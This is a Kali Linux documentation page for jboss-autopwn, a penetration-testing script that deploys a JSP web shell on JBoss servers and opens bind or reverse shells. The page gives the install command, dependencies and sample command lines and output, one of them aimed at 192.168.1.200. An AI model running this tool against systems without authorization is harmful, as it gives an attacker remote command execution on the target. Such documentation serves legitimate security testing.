---
Title: jboss-autopwn
Homepage: https://github.com/SpiderLabs/jboss-autopwn
Repository: https://gitlab.com/kalilinux/packages/jboss-autopwn
Architectures: all
Version: 0.1-1kali1
Metapackages: kali-linux-everything kali-linux-large kali-tools-web 
Icon: images/jboss-autopwn-logo.svg
PackagesInfo: |
 ### jboss-autopwn
 
  This JBoss script deploys a JSP shell on the target JBoss
  AS server. Once deployed, the script uses its upload and
  command execution capability to provide an interactive
  session.
   
  Features include:
     - Multiplatform support - tested on Windows, Linux and Mac targets
     - Support for bind and reverse bind shells
     - Meterpreter shells and VNC support for Windows targets
 
 **Installed size:** `114 KB`  
 **How to install:** `sudo apt install jboss-autopwn`  
 
 {{< spoiler "Dependencies:" >}}
 * curl
 * metasploit-framework
 {{< /spoiler >}}
 
 ##### jboss-linux
 
 
 ```
 root@kali:~# jboss-linux -h
 [x] Retrieving cookie
 [x] Now creating BSH script...
 [!] Cound not create BSH script..
 [x] Now deploying .war file:
 [x] Something went wrong...
 ```
 
 - - -
 
 ##### jboss-win
 
 
 ```
 root@kali:~# jboss-win -h
 [x] Retrieving cookie
 [x] Now creating BSH script...
 [x] .war file created successfully on c: 
 [x] Now deploying .war file:
 [x] Web shell enabled!: http://-h:/browserwin/browser/Browser.jsp
 [x] Server name...:
 Usage: ncat [options] [hostname] [port]
   -n, --nodns                Do not resolve hostnames via DNS
       --allow                Allow only given hosts to connect to Ncat
       --allowfile            A file of hosts allowed to connect to Ncat
       --deny                 Deny given hosts from connecting to Ncat
       --denyfile             A file of hosts denied from connecting to Ncat
       --proxy <addr[:port]>  Specify address of host to proxy through
 [x] Would you like a reverse or bind shell or vnc(bind)? 
 ```
 
 - - -
 
---
{{% hidden-comment "<!--Do not edit anything above this line-->" %}}

## jboss-autopwn Usage Example

Attack the target server (`192.168.1.200`) on the specified port (`8080`), redirecting stderr (`2> /dev/null`):

```
root@kali:~# jboss-linux 192.168.1.200 8080 2> /dev/null
[x] Retrieving cookie
[x] Now creating BSH script...
[!] Cound not create BSH script..
[x] Now deploying .war file:
```
